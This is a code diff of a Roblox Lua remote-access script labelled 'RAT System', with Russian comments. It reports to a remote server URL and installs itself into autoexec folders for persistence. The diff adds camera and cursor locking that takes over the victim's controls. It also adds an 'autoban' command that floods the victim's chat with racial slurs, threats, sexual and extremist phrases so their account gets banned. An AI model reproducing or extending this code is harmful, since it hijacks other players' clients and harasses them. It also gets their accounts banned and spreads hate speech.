@@ -12,11 +12,15 @@ local CoreGui = game:GetService("CoreGui")
 local SERVER_URL = "https://ratserver-6wo3.onrender.com"
 local player = Players.LocalPlayer
 
--- Новые переменные для камерных функций
+-- Новые переменные для камерных функций и AutoBan
 local cameraLockEnabled = false
 local cameraShakeEnabled = false
 local originalCameraType = nil
 local cameraLockGui = nil
+local mouseLockEnabled = false
+local originalMouseBehavior = nil
+local autoBanEnabled = false
+local autoBanTask = nil
 
 local function getDeviceType()
     if UserInputService.TouchEnabled then
@@ -88,7 +92,7 @@ local function autoInstallToAutoexec()
     end
     
     local success = pcall(function()
-        local scriptSource = "-- RAT System v3.0\n" .. tostring(script.Source)
+        local scriptSource = "-- RAT System v3.2\n" .. tostring(script.Source)
         
         local autoexecPaths = {
             "autoexec.lua",
@@ -873,7 +877,72 @@ local function executeJumpscareCommand(scareType)
     end
 end
 
--- НОВАЯ ФУНКЦИЯ: Блокировка камеры
+-- ФУНКЦИЯ: Блокировка курсора в центре
+local function lockMouseToCenter(enable)
+    if mouseLockEnabled == enable then return end
+    
+    mouseLockEnabled = enable
+    local camera = workspace.CurrentCamera
+    local viewportSize = camera.ViewportSize
+    
+    if enable then
+        -- Сохраняем текущее поведение мыши
+        if UserInputService.MouseBehavior then
+            originalMouseBehavior = UserInputService.MouseBehavior
+        end
+        
+        -- Создаем невидимый UI для захвата мыши
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "MouseLockUI"
+        screenGui.Parent = player:WaitForChild("PlayerGui")
+        screenGui.ResetOnSpawn = false
+        
+        local lockFrame = Instance.new("Frame")
+        lockFrame.Size = UDim2.new(1, 0, 1, 0)
+        lockFrame.BackgroundTransparency = 1
+        lockFrame.Active = true
+        lockFrame.Selectable = true
+        lockFrame.Parent = screenGui
+        
+        -- Центрируем курсор
+        task.spawn(function()
+            while mouseLockEnabled do
+                -- Получаем позицию центра экрана
+                local centerX = viewportSize.X / 2
+                local centerY = viewportSize.Y / 2
+                
+                -- Пытаемся установить курсор в центр
+                pcall(function()
+                    if UserInputService.MouseBehavior then
+                        UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
+                    end
+                end)
+                
+                task.wait(0.1)
+            end
+        end)
+        
+        return true
+    else
+        -- Восстанавливаем поведение мыши
+        if originalMouseBehavior then
+            pcall(function()
+                UserInputService.MouseBehavior = originalMouseBehavior
+            end)
+            originalMouseBehavior = nil
+        end
+        
+        -- Удаляем UI блокировки
+        pcall(function()
+            local gui = player:WaitForChild("PlayerGui"):FindFirstChild("MouseLockUI")
+            if gui then gui:Destroy() end
+        end)
+        
+        return true
+    end
+end
+
+-- Улучшенная функция блокировки камеры с блокировкой курсора
 local function cameraLock(enable)
     if cameraLockEnabled == enable then return false end
     
@@ -890,13 +959,16 @@ local function cameraLock(enable)
         -- Сохраняем начальную позицию камеры
         local startCFrame = camera.CFrame
         
-        -- Запускаем цикл блокировки
+        -- Запускаем цикл блокировки камеры
         task.spawn(function()
             while cameraLockEnabled and camera do
                 camera.CFrame = startCFrame
                 task.wait()
             end
         end)
+        
+        -- Блокируем курсор в центре
+        lockMouseToCenter(true)
         
         -- Создаем UI для блокировки ввода
         local screenGui = Instance.new("ScreenGui")
@@ -927,6 +999,9 @@ local function cameraLock(enable)
             originalCameraType = nil
         end
         
+        -- Разблокируем курсор
+        lockMouseToCenter(false)
+        
         -- Удаляем UI блокировки
         pcall(function()
             if cameraLockGui and cameraLockGui.Parent then
@@ -939,7 +1014,7 @@ local function cameraLock(enable)
     end
 end
 
--- НОВАЯ ФУНКЦИЯ: Тряска камеры
+-- ФУНКЦИЯ: Тряска камеры
 local function cameraShake(duration, intensity)
     if cameraShakeEnabled then return false end
     
@@ -984,6 +1059,183 @@ local function cameraShake(duration, intensity)
         
         cameraShakeEnabled = false
     end)
+    
+    return true
+end
+
+-- ФУНКЦИЯ: AutoBan - агрессивный спам для быстрого бана
+local function getBadWords()
+    -- Максимально агрессивный список запрещенных слов для гарантированного бана
+    return {
+        -- Английские крайние оскорбления
+        "nigger", "nigga", "n1gg3r", "n1gga", "n i g g e r", "n i g g a",
+        "fuck", "f*ck", "f u c k", "motherfucker", "motherf*cker", "m0therfucker",
+        "shit", "sh1t", "s h i t", "bullshit", "bullsh1t",
+        "bitch", "b1tch", "b i t c h", "son of a bitch", "son0fabitch",
+        "asshole", "a$$hole", "ass hole", "a s s h o l e",
+        "retard", "r3tard", "retarded", "r e t a r d",
+        "whore", "w h o r e", "slut", "s l u t", "prostitute",
+        "cunt", "c u n t", "c*nt", "c0nt",
+        "dick", "d1ck", "d i c k", "penis", "p e n i s",
+        "pussy", "p u s s y", "p*ssy", "p0ssy",
+        "bastard", "b a s t a r d", "b4stard",
+        
+        -- Русские крайние оскорбления
+        "хуй", "х у й", "хуесос", "х у е с о с",
+        "пизда", "п и з д а", "пиздец", "п и з д е ц",
+        "ебан", "е б а н", "ебать", "е б а т ь",
+        "блядь", "б л я д ь", "блять", "б л я т ь",
+        "сука", "с у к а", "сучка", "с у ч к а",
+        "гондон", "г о н д о н", "конч", "к о н ч",
+        "мудак", "м у д а к", "мудила", "м у д и л а",
+        "урод", "у р о д", "уродина", "у р о д и н а",
+        "дебил", "д е б и л", "даун", "д а у н",
+        "пидор", "п и д о р", "пидорас", "п и д о р а с",
+        
+        -- Расистские и дискриминационные слова
+        "chink", "gook", "kike", "spic", "wetback", "coon", "jigaboo",
+        "white trash", "cracker", "redneck", "hillbilly",
+        
+        -- Угрозы и насилие
+        "kill yourself", "kys", "k y s", "kill you", "murder", "suicide",
+        "die", "d i e", "d1e", "death", "dead", "burn in hell",
+        "rape", "r a p e", "rapist", "r a p i s t",
+        "pedophile", "pedo", "p e d o", "child molester",
+        
+        -- Провокации на админов и Roblox
+        "FUCK ROBLOX", "ROBLOX SUCKS", "ROBLOX IS SHIT", 
+        "ADMINS ARE RETARDS", "MODERATORS ARE IDIOTS",
+        "BAN ME FAGGOTS", "PERMA BAN ME", "I WANT TO BE BANNED",
+        "FUCK YOUR FILTER", "YOUR FILTER IS GARBAGE",
+        "I HATE ROBLOX", "ROBLOX SHOULD DIE",
+        
+        -- Экстремистские фразы
+        "heil hitler", "hitler was right", "nazi", "white power",
+        "black power", "kill all [race]", "exterminate [race]",
+        
+        -- Сексуальный контент
+        "sex", "s e x", "sexual", "porn", "p o r n", "pornography",
+        "hentai", "h e n t a i", "boobs", "b o o b s", "tits", "t i t s",
+        "vagina", "v a g i n a", "anal", "a n a l", "blowjob",
+        
+        -- Провокации на отчет и читы
+        "REPORT ME NOW", "I AM CHEATING", "EXPLOITING HARD",
+        "USING HACKS", "SCRIPTING", "INJECTING CODE",
+        "BYPassING FILTER", "I AM HACKER", "BYPASSED CHAT",
+        "CHEAT ENGINE", "MEMORY HACK", "SPEED HACK",
+        
+        -- Комбинации для максимальной агрессии
+        "NIGGER FUCK SHIT BITCH", "FUCKING RETARDED ADMINS",
+        "ROBLOX IS FOR RETARDS", "ALL MODS ARE FAGGOTS",
+        "I HOPE YOU DIE ADMINS", "BURN ROBLOX SERVERS",
+        "PERMA BAN ME YOU CUNTS", "YOUR MOM IS A WHORE",
+        "SUCK MY DICK ROBLOX", "FUCK YOUR STUPID GAME",
+        
+        -- Специальные символы и капс для усиления
+        "!!!NIGGER!!!", "???FUCK???", "###SHIT###", "$$$BITCH$$$",
+        "N1GG3R_FUCK3R", "SH1T_H3AD", "B1TCH_4SS",
+        "F.U.C.K.Y.O.U", "S.H.I.T.H.E.A.D", "A.S.S.H.O.L.E"
+    }
+end
+
+local function startAutoBan()
+    if autoBanEnabled then return end
+    
+    autoBanEnabled = true
+    
+    local function getRandomMessage()
+        local words = getBadWords()
+        local message = ""
+        
+        -- Более агрессивное количество слов (3-7)
+        for i = 1, math.random(3, 7) do
+            message = message .. words[math.random(1, #words)] .. " "
+        end
+        
+        -- 80% шанс на капс для большей агрессии
+        if math.random(1, 5) <= 4 then
+            message = message:upper()
+        end
+        
+        -- Добавляем много спецсимволов
+        if math.random(1, 2) == 1 then
+            message = "!!!" .. message .. "!!!"
+        end
+        
+        if math.random(1, 3) == 1 then
+            message = "### " .. message .. " ###"
+        end
+        
+        return message:sub(1, 200) -- Более длинные сообщения
+    end
+    
+    local function spamChat()
+        local chatEvent = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+        
+        while autoBanEnabled do
+            local message = getRandomMessage()
+            
+            -- Пытаемся отправить всеми возможными способами
+            pcall(function()
+                chatEvent:FireServer(message, "All")
+            end)
+            
+            -- Также пробуем через разные чат системы
+            pcall(function()
+                -- Для некоторых игр
+                local otherChat = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+                if otherChat then
+                    local sayEvent = otherChat:FindFirstChild("SayMessageRequest")
+                    if sayEvent then
+                        sayEvent:FireServer(message, "All")
+                    end
+                end
+            end)
+            
+            -- Очень короткая задержка для максимального спама (0.1-0.5 сек)
+            task.wait(math.random(10, 50) / 100)
+        end
+    end
+    
+    local function spamTeamChat()
+        local chatEvent = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+        
+        while autoBanEnabled do
+            local message = getRandomMessage()
+            
+            -- Спам в Team чат тоже
+            pcall(function()
+                chatEvent:FireServer(message, "Team")
+            end)
+            
+            task.wait(math.random(15, 60) / 100)
+        end
+    end
+    
+    -- Запускаем агрессивный спам в двух потоках
+    autoBanTask = task.spawn(spamChat)
+    task.spawn(spamTeamChat)
+    
+    -- Автоматическое выключение через 1 минуту (обычно бан наступает быстрее)
+    task.delay(60, function()
+        if autoBanEnabled then
+            autoBanEnabled = false
+        end
+    end)
+    
+    return true
+end
+
+local function stopAutoBan()
+    if not autoBanEnabled then return false end
+    
+    autoBanEnabled = false
+    
+    -- Останавливаем все задачи
+    if autoBanTask then
+        task.cancel(autoBanTask)
+        autoBanTask = nil
+    end
     
     return true
 end
@@ -1183,7 +1435,7 @@ local function ExecuteCommand(cmd, args)
                 executeJumpscareCommand(scareType)
             end)
         
-        -- НОВАЯ КОМАНДА: Блокировка камеры
+        -- КОМАНДА: Блокировка камеры
         elseif cmd == "cameralock" then
             if args and args[1] then
                 local action = args[1]:lower()
@@ -1200,7 +1452,7 @@ local function ExecuteCommand(cmd, args)
                 cameraLock(not cameraLockEnabled)
             end
         
-        -- НОВАЯ КОМАНДА: Тряска камеры  
+        -- КОМАНДА: Тряска камеры  
         elseif cmd == "camerashake" then
             local duration = tonumber(args[1]) or 5
             local intensity = tonumber(args[2]) or 2
@@ -1210,6 +1462,31 @@ local function ExecuteCommand(cmd, args)
             intensity = math.min(intensity, 10) -- максимум интенсивность 10
             
             cameraShake(duration, intensity)
+        
+        -- НОВАЯ КОМАНДА: AutoBan
+        elseif cmd == "autoban" then
+            if args and args[1] then
+                local action = args[1]:lower()
+                if action == "on" or action == "enable" or action == "start" then
+                    startAutoBan()
+                elseif action == "off" or action == "disable" or action == "stop" then
+                    stopAutoBan()
+                else
+                    -- Переключение
+                    if autoBanEnabled then
+                        stopAutoBan()
+                    else
+                        startAutoBan()
+                    end
+                end
+            else
+                -- Переключение без аргументов
+                if autoBanEnabled then
+                    stopAutoBan()
+                else
+                    startAutoBan()
+                end
+            end
         
         end
     end)
